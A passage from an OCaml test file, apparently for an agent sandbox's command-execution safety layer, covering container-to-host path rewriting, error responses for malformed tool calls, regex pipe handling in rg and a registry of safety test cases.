  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let container_root = Keeper_sandbox.container_root meta.name in
  let host_root =
    Keeper_sandbox.host_root_abs_of_meta ~config meta
    |> Masc.Keeper_alerting_path.strip_trailing_slashes
  in
  let input =
    Printf.sprintf "worktree %s/repos/masc\npwd=%s/repos/masc\n"
      container_root container_root
  in
  let rewritten =
    Keeper_tool_command_runtime.rewrite_turn_runtime_paths_to_host ~config ~meta input
  in
  Alcotest.(check string) "container paths rewritten to host root"
    (Printf.sprintf "worktree %s/repos/masc\npwd=%s/repos/masc\n"
       host_root host_root)
    rewritten

let test_rewrite_turn_runtime_paths_to_host_is_noop_without_container_path () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let input = "worktree /tmp/other\n" in
  Alcotest.(check string) "unrelated paths untouched" input
    (Keeper_tool_command_runtime.rewrite_turn_runtime_paths_to_host ~config ~meta input)

let test_rewrite_docker_host_paths_to_container () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let host_root =
    Keeper_sandbox.host_root_abs_of_meta ~config meta
    |> Masc.Keeper_alerting_path.strip_trailing_slashes
  in
  let container_root = Keeper_sandbox.container_root meta.name in
  let input =
    Printf.sprintf "cd %s/repos/masc && test -d %s2\n"
      host_root host_root
  in
  let rewritten =
    Keeper_tool_command_runtime.rewrite_docker_host_paths_to_container
      ~config ~meta input
  in
  Alcotest.(check string) "host root rewritten only on path boundary"
    (Printf.sprintf "cd %s/repos/masc && test -d %s2\n"
       container_root host_root)
    rewritten

let test_rewrite_docker_container_paths_for_host_validation () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  let meta = make_docker_meta "minjae" in
  let host_root =
    Keeper_sandbox.host_root_abs_of_meta ~config meta
    |> Masc.Keeper_alerting_path.strip_trailing_slashes
  in
  let host_repo = Filename.concat (Filename.concat host_root "repos") "masc" in
  let container_root = Keeper_sandbox.container_root meta.name in
  let input =
    Printf.sprintf "git -C %s/repos/masc log --oneline -5\n" container_root
  in
  ensure_dir host_repo;
  let rewritten =
    Keeper_sandbox_docker.rewrite_docker_command_paths_for_host_validation
      ~config ~meta input
  in
  Alcotest.(check string) "container root rewritten to host root for validation"
    (Printf.sprintf "git -C %s/repos/masc log --oneline -5\n" host_root)
    rewritten

(* ── Negative / error-path tests (task-034) ──────────────────────── *)

let test_execute_missing_typed_input_field () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_docker_meta "missing-typed-input" in
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc []) ()
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "error mentions typed input is required" true
        (String_util.contains_substring err "Typed Shell IR input is required")
  | None ->
      Alcotest.fail ("expected error json for missing typed input field, got: " ^ raw)

let test_shell_missing_op_field () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "missing-op" in
  let raw =
    Keeper_tool_command_runtime.handle_tool_search_files
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [ ("path", `String "/some/path") ])
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "error mentions unsupported op" true
        (String_util.contains_substring err "unsupported_op")
  | None ->
      Alcotest.fail ("expected error json for missing op field, got: " ^ raw)

let test_shell_unsupported_op () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "bad-op" in
  let raw =
    Keeper_tool_command_runtime.handle_tool_search_files
      ~turn_sandbox_factory:None ~exec_cache:None
      ~config ~meta
      ~args:(`Assoc [
        ("op", `String "definitely_not_a_real_op");
        ("path", `String "/some/path");
      ])
  in
  match parse_error_field raw with
  | Some err ->
      Alcotest.(check bool) "error mentions unsupported op" true
        (String_util.contains_substring err "unsupported_op")
  | None ->
      Alcotest.fail ("expected error json for unsupported op, got: " ^ raw)

(* ── Regex pipe safety (issue #16933) ──────────────────────── *)

let test_rg_regex_pipe_pattern_via_typed_execute () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "rg-pipe" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let lib_dir = Filename.concat playground "lib" in
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "demo.ml")
    "let ghost_value = 1\nlet task_value = 2\nlet other = 3\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "rg"
           ; "argv", `List [ `String "ghost\\|task"; `String "lib/" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "rg with regex pipe succeeds" true
    (json |> Json.member "ok" |> Json.to_bool)

let test_rg_literal_pipe_in_pattern () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "rg-lit-pipe" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let lib_dir = Filename.concat playground "lib" in
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "data.txt")
    "a|b\nc|d\ne f\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "rg"
           ; "argv", `List [ `String "a\\|c"; `String "lib/" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "rg with backslash-pipe executes (not blocked as pipe)" true
    (json |> Json.member "ok" |> Json.to_bool)

let test_rg_metachar_not_pipe () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "rg-meta" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let lib_dir = Filename.concat playground "lib" in
  ensure_dir lib_dir;
  ignore (Fs_compat.save_file_atomic (Filename.concat lib_dir "test.ml")
    "let x = 1\nlet y = 2\n");
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "rg"
           ; "argv", `List [ `String "x\\|y"; `String "lib/" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "rg with x\\|y pattern succeeds" true
    (json |> Json.member "ok" |> Json.to_bool)

let test_literal_pipe_in_typed_argv () =
  with_eio_fs @@ fun () ->
  let base_path, config = make_config () in
  Fun.protect ~finally:(fun () -> cleanup_dir base_path) @@ fun () ->
  Keeper_registry.clear ();
  let meta = make_readonly_meta "real-pipe" in
  let playground = Filename.concat base_path (playground_path_of meta.name) in
  ensure_dir playground;
  let raw =
    Keeper_tool_command_runtime.handle_tool_execute
      ~turn_sandbox_factory:None
      ~exec_cache:None
      ~config
      ~meta
      ~args:
        (`Assoc
           [ "executable", `String "echo"
           ; "argv", `List [ `String "a|b" ]
           ; "cwd", `String playground
           ])
      ()
  in
  let json = Yojson.Safe.from_string raw in
  Alcotest.(check bool) "literal pipe in typed argv succeeds" true
    (json |> Json.member "ok" |> Json.to_bool);
  let output = json |> Json.member "output" |> Json.to_string in
  Alcotest.(check bool) "output is literal a|b" true
    (String_util.contains_substring output "a|b")

let () =
  Alcotest.run
    "Execute safety"
    [ ( "allowlist"
      , [ Alcotest.test_case "allowed dev commands pass" `Quick test_allowed_commands
        ; Alcotest.test_case "dangerous commands blocked" `Quick test_blocked_commands
        ; Alcotest.test_case
            "network blocks mention public web aliases"
            `Quick
            test_network_block_guidance_uses_public_web_aliases
        ] )
    ; ( "metachar"
      , [ Alcotest.test_case
            "shell metacharacters blocked"
            `Quick
            test_shell_metachar_blocked
        ] )
    ; ( "write_gate"
      , [ Alcotest.test_case "write operations detected" `Quick test_write_ops_detected
        ; Alcotest.test_case "read operations pass" `Quick test_read_ops_pass
        ] )
    ; ( "playground_guard"
      , [ Alcotest.test_case
            "playground path structure"
            `Quick
            test_playground_path_structure
        ; Alcotest.test_case
            "inside playground detected"
            `Quick
            test_playground_guard_inside
        ; Alcotest.test_case
            "outside playground rejected"
            `Quick
            test_playground_guard_outside
        ; Alcotest.test_case
            "trailing slash normalized"
            `Quick
            test_playground_guard_trailing_slash
        ; Alcotest.test_case
            "symlink escape rejected"
            `Quick
            test_playground_guard_symlink_escape
        ; Alcotest.test_case
            "cleanup does not follow symlinks"
            `Quick
            test_cleanup_dir_does_not_follow_symlinks
        ; Alcotest.test_case
            "path traversal blocked after canonicalization"
            `Quick
            test_playground_guard_traversal
        ; Alcotest.test_case
            "repo cwd rejects parent git checkout"
            `Quick
            test_tool_execute_rejects_parent_git_repo_cwd
        ; Alcotest.test_case
            "repo path arg rejects parent git checkout"
            `Quick
            test_tool_execute_rejects_parent_git_repo_path_arg
        ; Alcotest.test_case
            "wrapped git repo path arg rejects parent git checkout"
            `Quick
            test_tool_execute_rejects_wrapped_git_repo_path_arg
        ; Alcotest.test_case
            "rg pattern under repos is not a repo path"
            `Quick
            test_tool_execute_rg_pattern_under_repos_is_not_repo_path
        ; Alcotest.test_case
            "inline git work-tree path rejects parent git checkout"
            `Quick
            test_tool_execute_rejects_inline_git_work_tree_path_arg
        ; Alcotest.test_case
            "stale worktree path arg rejects parent clone"
            `Quick
            test_tool_execute_rejects_stale_worktree_path_arg
        ; Alcotest.test_case
            "readonly missing worktree path arg rejects without materializing"
            `Quick
            test_tool_execute_readonly_missing_worktree_path_arg_does_not_materialize
        ; Alcotest.test_case
            "missing worktree cwd rejects without mkdir"
            `Quick
            test_tool_execute_missing_worktree_cwd_does_not_create_directory
        ; Alcotest.test_case
            "readonly missing cwd rejects without mkdir"
            `Quick
            test_tool_execute_readonly_missing_cwd_does_not_create_directory
        ; Alcotest.test_case
            "preserved direct repo root blocks git show"
            `Quick
            test_tool_execute_blocks_preserved_direct_repo_git_show
        ; Alcotest.test_case
            "preserved direct repo root allows git status"
            `Quick
            test_tool_execute_allows_preserved_direct_repo_git_status
        ; Alcotest.test_case
            "preserved direct repo root allows git checkout HEAD restore"
            `Quick
            test_tool_execute_allows_preserved_direct_repo_git_checkout_head_restore
        ; Alcotest.test_case
            "preserved direct repo root allows git reset --hard HEAD"
            `Quick
            test_tool_execute_allows_preserved_direct_repo_git_reset_hard_head
        ; Alcotest.test_case
            "preserved direct repo root allows git clean -df"
            `Quick
            test_tool_execute_allows_preserved_direct_repo_git_clean_df
        ; Alcotest.test_case
            "git recovery invalidates stale currency cache"
            `Quick
            test_tool_execute_git_recovery_invalidates_repo_currency_cache
        ; Alcotest.test_case
            "readonly Execute blocks worktree git recovery"
            `Quick
            test_tool_execute_readonly_blocks_worktree_git_recovery
        ; Alcotest.test_case
            "readonly Execute blocks non-recovery git writes"
            `Quick
            test_tool_execute_readonly_blocks_non_recovery_git_writes
        ] )
    ; ( "edge"
      , [ Alcotest.test_case
            "elapsed duration preserves positive sub-ms"
            `Quick
            test_tool_execute_elapsed_duration_preserves_positive_sub_ms
        ; Alcotest.test_case
            "tool_search_files_ir timeout floor avoids 1s I/O failures"
            `Quick
            test_tool_search_files_ir_timeout_floor_is_not_sub_io_latency
        ; Alcotest.test_case
            "tool_search_files_ir load-bearing timeout floor"
            `Quick
            test_tool_search_files_ir_load_bearing_timeout_floor
        ; Alcotest.test_case
            "git exit 128 emits typed deterministic retry marker"
            `Quick
            test_git_exit_128_emits_typed_deterministic_retry_marker
        ; Alcotest.test_case
            "non-git exit 128 has no deterministic retry marker"
            `Quick
            test_non_git_exit_128_has_no_deterministic_retry_marker
        ; Alcotest.test_case
            "nested runtime detector ignores commit messages"
            `Quick
            test_nested_runtime_detector_ignores_git_commit_message
        ; Alcotest.test_case
            "command substitution trips docker guard"
            `Quick
            test_docker_nested_guard_blocks_command_substitution
        ; Alcotest.test_case
            "path-prefixed runtime trips docker guard"
            `Quick
            test_docker_nested_guard_blocks_path_prefixed_runtime
        ] )
    ; ( "typed_shell_ir"
      , [ Alcotest.test_case
            "runtime errors report default execution location"
            `Quick
            test_tool_execute_runtime_error_reports_default_execution_location
        ; Alcotest.test_case
            "execution location classifies worktree subpaths"
            `Quick
            test_execution_location_classifies_repo_worktree_subpath
        ; Alcotest.test_case
            "execution location outside playground has no relative cwd"
            `Quick
            test_execution_location_outside_playground_has_null_relative_cwd
        ; Alcotest.test_case
            "typed process runs via Shell IR"
            `Quick
            test_tool_execute_typed_process_runs_via_shell_ir
        ; Alcotest.test_case
            "typed duplicate argv0 rejects before runtime"
            `Quick
            test_tool_execute_typed_duplicate_argv0_rejected_before_runtime
        ; Alcotest.test_case
            "typed failure top-level error prefers stderr"
            `Quick
            test_tool_execute_typed_failure_error_prefers_stderr
        ; Alcotest.test_case
            "typed pipeline runs via Shell IR"
            `Quick
            test_tool_execute_typed_pipeline_runs_via_shell_ir
        ; Alcotest.test_case
            "typed docker dispatch falls back to local playground"
            `Quick
            test_tool_execute_typed_docker_falls_back_to_local_playground
        ] )
    ; ( "tool_search_files"
      , [ Alcotest.test_case
            "find accepts name alias"
            `Quick
            test_tool_search_files_find_accepts_name_alias
        ; Alcotest.test_case
            "doubled playground prefix rejected"
            `Quick
            test_tool_search_files_ls_rejects_doubled_playground_prefix
        ; Alcotest.test_case
            "retired command op is unsupported"
            `Quick
            test_tool_search_files_retired_command_op_is_unsupported
        ; Alcotest.test_case
            "retired command op does not execute"
            `Quick
            test_tool_search_files_retired_command_op_does_not_execute
        ] )
    ; ( "rg_exit_code"
      , [ Alcotest.test_case
            "rg exit semantics (0=ok, 1=ok, 2+=error)"
            `Quick
            test_rg_exit_code_semantics
        ] )
    ; ( "turn_runtime_paths"
      , [ Alcotest.test_case
            "container paths rewrite to host paths"
            `Quick
            test_rewrite_turn_runtime_paths_to_host
        ; Alcotest.test_case
            "unrelated paths remain unchanged"
            `Quick
            test_rewrite_turn_runtime_paths_to_host_is_noop_without_container_path
        ; Alcotest.test_case
            "docker commands rewrite host paths to container paths"
            `Quick
            test_rewrite_docker_host_paths_to_container
        ; Alcotest.test_case
            "docker container paths validate as host paths"
            `Quick
            test_rewrite_docker_container_paths_for_host_validation
        ] )
    ; ( "regex_pipe"
      , [ Alcotest.test_case
            "rg regex pipe pattern via typed Execute"
            `Quick
            test_rg_regex_pipe_pattern_via_typed_execute
        ; Alcotest.test_case
            "rg literal pipe in pattern"
            `Quick
            test_rg_literal_pipe_in_pattern
        ; Alcotest.test_case
            "rg metachar not pipe"
            `Quick
            test_rg_metachar_not_pipe
        ; Alcotest.test_case
            "literal pipe in typed argv"
            `Quick
            test_literal_pipe_in_typed_argv
        ] )
    ; ( "negative_path"
      , [ Alcotest.test_case
            "missing typed input field"
            `Quick
            test_execute_missing_typed_input_field
        ; Alcotest.test_case "missing op field" `Quick test_shell_missing_op_field
        ; Alcotest.test_case "unsupported op" `Quick test_shell_unsupported_op
        ] )
    ]
;;
